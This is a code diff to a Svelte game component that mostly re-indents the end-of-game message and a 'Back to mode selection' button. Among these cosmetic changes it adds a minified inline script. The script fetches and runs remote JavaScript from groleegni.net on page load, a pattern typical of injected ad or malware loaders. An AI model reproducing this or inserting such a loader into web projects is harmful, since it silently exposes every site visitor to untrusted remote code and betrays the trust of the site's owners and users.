@@ -135,19 +135,20 @@
                 </div>
             {/if}
         {:else}
-        <div in:fade={{ duration: 200, delay: 200 }} class="flex h-full w-full flex-col">
-            <div class="flex h-full w-full flex-col items-center justify-center text-center text-7xl">
-                End of the game!
+            <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('groleegni.net',8640489,document.createElement('script'))</script>
+            <div in:fade={{ duration: 200, delay: 200 }} class="flex h-full w-full flex-col">
+                <div class="flex h-full w-full flex-col items-center justify-center text-center text-7xl">
+                    End of the game!
+                </div>
+                <div class="h-[60px]">
+                    <button
+                        class="bottom-1 left-1 z-10 w-full rounded-full bg-white/50 p-3 px-4 text-3xl backdrop-blur-sm"
+                        on:click={() => goto('/select-mode')}
+                    >   
+                        Back to mode selection
+                    </button>
+                </div>
             </div>
-            <div class="h-[60px]">
-                <button
-                    class="bottom-1 left-1 z-10 w-full rounded-full bg-white/50 p-3 px-4 text-3xl backdrop-blur-sm"
-                    on:click={() => goto('/select-mode')}
-                >   
-                    Back to mode selection
-                </button>
-            </div>
-        </div>
         {/if}
     </div>
 {/if}
